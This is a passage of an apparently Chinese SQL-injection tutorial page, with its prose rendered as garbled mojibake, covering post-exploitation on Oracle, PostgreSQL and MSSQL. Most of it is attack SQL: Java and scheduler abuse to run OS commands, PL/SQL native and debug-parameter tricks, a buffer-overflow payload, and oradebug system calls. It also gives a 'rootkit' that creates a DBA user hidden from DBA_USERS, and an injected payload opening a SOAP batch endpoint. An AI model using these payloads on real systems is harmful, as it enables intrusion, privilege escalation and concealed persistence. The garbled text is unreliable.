keyword">DECLARE</span> POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span> <span class="token keyword">CURSOR</span> Cl <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token keyword">GRANT</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span>SYS<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FilePermission<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token operator">&lt;&lt;</span><span class="token keyword">ALL</span> FI LES<span class="token operator">&gt;&gt;</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">execute</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>ENABLED<span class="token string">''</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> <span class="token keyword">BEGIN</span> <span class="token keyword">OPEN</span> Cl<span class="token punctuation">;</span> <span class="token keyword">FETCH</span> Cl <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>CLOSECI<span class="token punctuation">;</span>DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>DBMS_SCHEDULER</code></p><p>DBMS_SCHEDULERæ˜¯Oracle 10gåŠä¹‹åç‰ˆæœ¬ä¸­æ–°å¢çš„å†…å®¹ï¼Œå®ƒè¦æ±‚æ‹¥æœ‰CREATE JOB (10gR1)æˆ– CREATE EXTERNAL JOB(10gR2/11g)æƒé™ã€‚è‡ª 10.2.0.2 èµ·ï¼Œä¸èƒ½å†ä»¥ oracle ç”¨æˆ·èº« ä»½æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œè¦ä»¥nobodyç”¨æˆ·æ‰§è¡Œï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Create a Program for dbms_scheduler</span><span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_program<span class="token punctuation">(</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span><span class="token string">'EXECUTABLE'</span><span class="token punctuation">,</span><span class="token string">'c:\WINDOWS\system32\cmd.exe /c echo Owned &gt;&gt; c:\rds3.txt'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--Create, execute, and delete a Job for dbms_scheduler</span><span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_job<span class="token punctuation">(</span>job_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009JOB'</span><span class="token punctuation">,</span>program_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span>start_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>repeat_interval <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>end_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>enabled <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">,</span>auto_drop <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>PL/SQL native</code></p><p>æ‹¥æœ‰ä¿®æ”¹æ•°æ®åº“æœåŠ¡å™¨ä¸ŠSPNC_COMMANDSæ–‡æœ¬æ–‡ä»¶çš„æƒé™ã€‚å¦‚æœåˆ›å»ºäº†å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°æˆ–åŒ…å¹¶å¯ç”¨äº† PL/SQL native,é‚£ä¹ˆOracleä¼šæ‰§è¡Œè¯¥æ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚</p><p>ä¸‹åˆ—ä»£ç ä½¿ç”¨PL/SQL nativeä¸ºpublicæˆäºˆDBAæƒé™ã€‚grantå‘½ä»¤æ˜¯ä¸€æ¡é€šå¸¸ä»¥SYSç”¨æˆ·èº«ä»½æ‰§è¡Œçš„INSERT INTO SYSAUTHS$å‘½ä»¤ã€‚</p><p>æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåä¸ºe2.sqlä¸”ç”±sqlplus æ‰§è¡Œçš„æ–‡æœ¬æ–‡ä»¶ï¼Œsqlpluså‘½ä»¤å¯é€šè¿‡PL/SQL nativeæ¥å¯åŠ¨ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> Fl <span class="token keyword">return</span> numberauthid <span class="token keyword">current_user</span> <span class="token keyword">as</span>pragma autonomous_transaction<span class="token punctuation">;</span>v_file UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create directory TX as '</span>C:\'<span class="token operator">!</span><span class="token string">';begin-- grant dba to public;DBMS_ADVISOR.CREATE_FILE ('</span><span class="token keyword">insert</span> <span class="token keyword">into</span> sys<span class="token punctuation">.</span>sysauth$ <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">'||chr(13)||chr(10)||'</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token string">','</span>TX<span class="token string">','</span>e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">');end;EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory TX<span class="token operator">!</span><span class="token string">';EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">create</span> directory T <span class="token keyword">as</span> <span class="token string">'C:\ORACLE\ORA101\PLSQL'</span><span class="token operator">!</span><span class="token string">'; utl_file.fremove('</span>T<span class="token string">','</span>spnc_commands<span class="token string">');v_file: = utl_file.fopen ('</span>T<span class="token string">','</span>spnc_commancis<span class="token string">','</span>w<span class="token string">');utl_file.put_line(v_file,'</span>sqlplus <span class="token operator">/</span> <span class="token keyword">as</span> sysdba <span class="token variable">@c</span>:\e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">'); utl_file.fclose(v_file);EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory T<span class="token operator">!</span><span class="token string">';EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token operator">!</span><span class="token string">'; EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_library_dir<span class="token operator">=</span><span class="token string">'C:\'!'</span><span class="token punctuation">;</span> <span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create or replace procedure hl as begin null; end;!'</span><span class="token punctuation">;</span><span class="token keyword">COMMIT</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Oracle Text</code></p><p>Oracle Textä¹Ÿå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚é€šè¿‡ç”¨æˆ·è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨(USER_FILTER_PREF), å¯ä»¥å°†è¡¨çš„å†…å®¹ä¼ é€’ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡ä¸€ä¸ªè¡¨å°†TCLä»£ç ä¼ é€’ ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨ã€‚</p><p>ä½¿ç”¨Oracle Textç”¨æˆ·è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨å­˜åœ¨ç€ä¸€ä¸ªé™åˆ¶ã€‚åªèƒ½ä»ORACLE_HOME/binç›®å½•æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œoratclsh.exeå°±å¯ä»¥æ‰§è¡Œã€‚å¯¹äºè¿™ä¸€é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨UTL_FILEåŒ…å°†ç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°ORACLE_HOME/binç›®å½•ï¼Œä»¥ä¾¿æ‰§è¡Œè¯¥æ–‡ä»¶ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> t <span class="token punctuation">(</span>id number<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span> <span class="token keyword">text</span> varchar2<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Begin</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>drop_preference<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">begin</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>create_preference<span class="token punctuation">(</span>preference_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span>object_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>set_attribute<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span><span class="token string">'COMMAND'</span><span class="token punctuation">,</span><span class="token string">'oratclsh.exe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">begin</span><span class="token keyword">insert</span> <span class="token keyword">into</span> t <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'set f [open "C:/AHT.txt" {RDWR CREAT}]puts $f "Your System is not protected!"close $fset f [open [lindex $argv 0] {RDWR CREAT}]puts $f "SUCCESSH"close $f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">drop</span> <span class="token keyword">index</span> user_filter_idx<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">index</span> user_filter_idx <span class="token keyword">on</span> t <span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span>indextype <span class="token operator">is</span> ctxsys<span class="token punctuation">.</span>contextparameters <span class="token punctuation">(</span><span class="token string">'FILTER USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> token_text <span class="token keyword">from</span> DR$USER_FILTER_IDX$I<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Alter System set äº‹ä»¶</code></p><p>Alter System setæ˜¯ä¸€ç§éå…¬å¼€å‚æ•°(è‡ªOracle 10gä»¥æ¥)ï¼Œå®ƒå¯ä»¥æŒ‡å®šè‡ªå®šä¹‰è°ƒè¯•å™¨çš„åç§°ã€‚ åœ¨è°ƒè¯•äº‹ä»¶(debugging event)è¿‡ç¨‹ä¸­å°†æ‰§è¡Œè‡ªå®šä¹‰çš„è°ƒè¯•å™¨ï¼Œè€Œè°ƒè¯•äº‹ä»¶åˆ™éœ€äºˆä»¥å¼ºåˆ¶å®ç°ã€‚ ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> <span class="token string">"_oradbg_pathname"</span><span class="token operator">=</span><span class="token string">'/tmp/debug.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>PL/SQL native 9i</code></p><p>è‡ª9iR2ä»¥æ¥ï¼ŒOracleæä¾›äº†å°†PL/SQLä»£ç è½¬æ¢æˆCä»£ç çš„æ–¹æ³•ã€‚ä¸ºæé«˜çµæ´»æ€§ï¼ŒOracle å¯ä»¥ä¿®æ”¹makeå·¥å…·çš„åç§°(ä¾‹å¦‚ï¼Œä¿®æ”¹æˆcalc.exeæˆ–å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶)ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_make_utility<span class="token operator">=</span><span class="token string">'cmd.exe /c echo Owned &gt; c:\ rds.txt &amp;'</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token punctuation">;</span><span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> <span class="token keyword">procedure</span> rds <span class="token keyword">as</span> <span class="token keyword">begin</span> <span class="token boolean">null</span><span class="token punctuation">;</span> <span class="token keyword">end</span><span class="token punctuation">;</span> <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>ç¼“å†²åŒºæº¢å‡º</p><p>2004 å¹´ï¼ŒCesar Cerrudo å…¬å¸ƒ äº†å…³äº Oracle ä¸­ NUMTOYMINTERVA å’Œ NUMTODSINTERVAL è¿™ä¸¤ä¸ªå‡½æ•°çš„ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œä½¿ç”¨ä¸‹åˆ—æ¼æ´åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> NUMTOYMINTERVAL <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR'</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">141</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">172</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'echo ARE YOU SURE? &gt;c:\Unbreakable.txt'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>è‡ªå®šä¹‰åº”ç”¨ä»£ç </p><p>åœ¨Oracleé¢†åŸŸï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨åŒ…å«æ“ä½œç³»ç»Ÿå‘½ä»¤çš„è¡¨ï¼Œè¿™äº›å‘½ä»¤ç”±è¿æ¥åˆ°æ•°æ®åº“çš„å¤–éƒ¨ç¨‹åºæ‰§è¡Œã€‚ä½¿ç”¨æŒ‡å®šçš„å‘½ä»¤æ›´æ–°æ•°æ®åº“ä¸­è¿™æ ·çš„æ¡ç›®æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸å¯ä»¥æ§åˆ¶ç³»ç»Ÿã€‚æ£€æŸ¥æ‰€æœ‰è¡¨ä»¥å¯»æ‰¾åŒ…å«æ“ä½œç³»ç»Ÿå‘½ä»¤çš„åˆ—ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ°å‘½ä»¤è¡¨ï¼Œç­‰å¾…è¢«æ‰§è¡Œã€‚</p></li></ul><h5 id="ä»¥SYSDBAæ‰§è¡Œä»£ç "><a href="#ä»¥SYSDBAæ‰§è¡Œä»£ç " class="headerlink" title="ä»¥SYSDBAæ‰§è¡Œä»£ç "></a>ä»¥SYSDBAæ‰§è¡Œä»£ç </h5><p>å¯¹äºå…·æœ‰SYSDBAæƒé™(æ¯”å¦‚SYS)çš„ç”¨æˆ·æ¥è¯´ï¼Œä½¿ç”¨oradebug(9i R2ã€10g R2ã€11g R1æˆ–11g R2)è°ƒç”¨ä»»æ„çš„æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–DLL/åº“ã€‚ä»¥ä¸‹å‘½ä»¤ä¸­çš„ç©ºæ ¼å­—ç¬¦å¿…é¡»ä½¿ç”¨tabå­—ç¬¦æ¥ä»£æ›¿ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlplussys<span class="token operator">/</span>pw<span class="token variable">@dbserver</span><span class="token keyword">as</span>sysdba<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebugsetmypid<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebug<span class="token keyword">call</span>system<span class="token string">"/bin/touch-f/home/oracle/rds.txt"</span><span class="token keyword">Function</span>returned<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="PostgreSQL-5"><a href="#PostgreSQL-5" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼å°±æ˜¯è°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°(User-Defined Function, UDF)</p><p>å¯¹äºå­˜åœ¨äºæœ¬åœ°æ“ä½œç³»ç»Ÿä¹‹ä¸Šçš„å…±äº«åº“ï¼Œåº“ä¸­å°†æ²¡æœ‰magic blockå£°æ˜ã€‚æˆ‘ä»¬å¿…é¡»ä¸Šä¼ å…·æœ‰è¯¥å£°æ˜çš„æˆ‘ä»¬è‡ªå·±çš„å…±äº«åº“ã€‚åœ¨PostgreSQLä¸­ï¼Œå¯ä»¥å°†UDFæ”¾åœ¨PostgreSQLç”¨æˆ·å…·æœ‰è¯»/ å†™è®¿é—®æƒé™çš„ä»»ä½•ä½ç½®ã€‚åœ¨Linux/UNIXç³»ç»Ÿä¸­é€šå¸¸ä½äº/tmpç›®å½•ï¼Œåœ¨Windowsç³»ç»Ÿä¸­é€šå¸¸ä½ äº c:\windows\temp ç›®å½•ã€‚</p><p>è¦åŒ…å«magic block,åœ¨å·²ç»åŒ…å«äº†å¤´æ–‡ä»¶fmgr.hä¹‹å¤–ï¼Œè¿˜éœ€è¦åœ¨æºæ–‡ä»¶çš„å…¶ä¸­ä¸€ä¸ªæ¨¡å—(ä»…èƒ½æœ‰ä¸€ä¸ªæ¨¡å—)ä¸­åŒ…å«ä¸‹é¢çš„æŒ‡ä»¤ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># ifdef PG_MODULE_MAGIC</span>PG_MODULE_MAGIC<span class="token punctuation">;</span><span class="token comment"># endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å·©å›ºè®¿é—®"><a href="#å·©å›ºè®¿é—®" class="headerlink" title="å·©å›ºè®¿é—®"></a>å·©å›ºè®¿é—®</h3><p>Oracle rookkit</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- the following code must run as DBA</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">grant</span> dba <span class="token keyword">to</span> hidden identified <span class="token keyword">by</span> hidden_2009<span class="token punctuation">;</span><span class="token comment">-- create a user hidden with DBA privileges</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>disable_multiprocess <span class="token keyword">from</span> dual<span class="token punctuation">;</span> <span class="token comment">-- this SELECT statement is needed for newer version of Oracle (10.2.0.5,11.1.0.7, 11.2.0.x) to activate the identity change</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>change_user<span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- become user SYS </span><span class="token comment">-- change the users record in sys.user$</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">update</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">set</span> tempts<span class="token comment">#=666 where name='HIDDEN';</span><span class="token comment">-- does not show the user HIDDEN</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> username <span class="token keyword">from</span> dba_users<span class="token punctuation">;</span><span class="token comment">-- but the connect works</span><span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">connect</span> hidden<span class="token operator">/</span>hidden_2009<span class="token comment">#Oracleä½¿ç”¨ALL_USERSå’ŒDBA_USERSè§†å›¾æ¥æ˜¾ç¤ºç”¨æˆ·åˆ—è¡¨ï¼Œè¿™äº›è§†å›¾åŒ…å«äº†ä¸‰å¼ è¡¨çš„å¹¶é›†ã€‚é€šè¿‡å°†tempts#(æˆ–datats#æˆ–type#)è®¾ç½®æˆä¸å­˜åœ¨çš„å€¼ï¼Œå¯ä»¥ä»å¹¶é›†ç»“æœå’Œè§†å›¾ä¸­æ¸…é™¤ç”¨æˆ·ï¼š</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FORCE</span> <span class="token keyword">VIEW</span> <span class="token string">"SYS"</span><span class="token punctuation">.</span><span class="token string">"ALLâ€”USERS"</span> <span class="token punctuation">(</span><span class="token string">"USERNAME"</span><span class="token punctuation">,</span><span class="token string">"USER_ID"</span><span class="token punctuation">,</span><span class="token string">"CREATED"</span><span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token keyword">select</span> u<span class="token punctuation">.</span>name<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token comment">#, u.ctime</span><span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ u<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ dts<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ tts<span class="token keyword">where</span> u<span class="token punctuation">.</span>datats<span class="token comment"># = dts.ts#</span><span class="token operator">and</span> u<span class="token punctuation">.</span>tempts<span class="token comment"># = tts.ts#</span><span class="token operator">and</span> u<span class="token punctuation">.</span><span class="token keyword">type</span><span class="token comment"># = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡http.sys(ç®¡ç†IISçš„åŒä¸€å†…æ ¸ç»„ä»¶)æš´éœ²åŸºäºSOAP(ç®€å•å¯¹è±¡è®¿é—®åè®®)çš„WebæœåŠ¡ï¼Œä½¿ç”¨T-SQLå‘½ä»¤å¯ç”¨ç«¯ç‚¹ä¸Šçš„æ‰¹å¤„ç†æ—¶ï¼Œç«¯ç‚¹ä¼šéšå¼æš´éœ²å¦ä¸€ç§åä¸ºsqlbatchçš„SOAP æ–¹æ³•ã€‚sqlbatchæ–¹æ³•å¯ä»¥é€šè¿‡SOAPæ¥æ‰§è¡ŒT-SQLè¯­å¥ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å‘å‡ºè¯·æ±‚æ¥åˆ›å»ºéœ€è¦çš„SOAP ç«¯ç‚¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token string">' exec('</span><span class="token keyword">CREATE</span> ENDPOINT ep2 STATE<span class="token operator">=</span>STARTED <span class="token keyword">AS</span> HTTP <span class="token punctuation">(</span>AUTHENTICATION <span class="token operator">=</span> <span class="token punctuation">(</span>INTEGRATED<span class="token punctuation">)</span><span class="token punctuation">,</span>PATH <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">/</span>sp<span class="token string">''</span><span class="token punctuation">,</span>PORTS<span class="token operator">=</span><span class="token punctuation">(</span>CLEAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">FOR</span> SOAP <span class="token punctuation">(</span>BATCHES<span class="token operator">=</span>ENABLED<span class="token punctuation">)</span>'<span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°ä»£ç åœ¨victimæœåŠ¡å™¨çš„/spç›®å½•ä¸­åˆ›å»ºäº†ä¸€ä¸ªSOAPç«¯ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯¥ç«¯ç‚¹ä¸Šç„å‡† ä¸€ä¸ªSOAPè¯·æ±‚ï¼ˆä½¿ç”¨åµŒå…¥å¼SQLæŸ¥è¯¢ï¼‰ã€‚</p><h2 id="é«˜çº§è¯é¢˜"><a href="#é«˜çº§è¯é¢˜" class="headerlink" title="é«˜çº§è¯é¢˜"></a>é«˜çº§è¯é¢˜</h2><h3 id="é¿å¼€è¾“å…¥è¿‡æ»¤å™¨"><a href="#é¿å¼€è¾“å…¥è¿‡æ»¤å™¨" class="headerlink" title="é¿å¼€è¾“å…¥è¿‡æ»¤å™¨"></a>é¿å¼€è¾“å…¥è¿‡æ»¤å™¨</h3><p>Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰æˆ–å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼ˆIPSï¼‰</p><p>é€šå¸¸ä¼šè¿‡æ»¤SQLå…³é”®è¯ï¼Œå¦‚selectï¼Œinsertï¼Œandç­‰ã€è¿˜æœ‰ç‰¹å®šå­—ç¬¦ï¼Œå¦‚å•å¼•å·ï¼Œè¿æ¥å­—ç¬¦ã€è¿˜æœ‰ç©ºç™½ç¬¦</p><h4 id="ä½¿ç”¨å¤§å°å†™å˜ç§ç»•è¿‡"><a 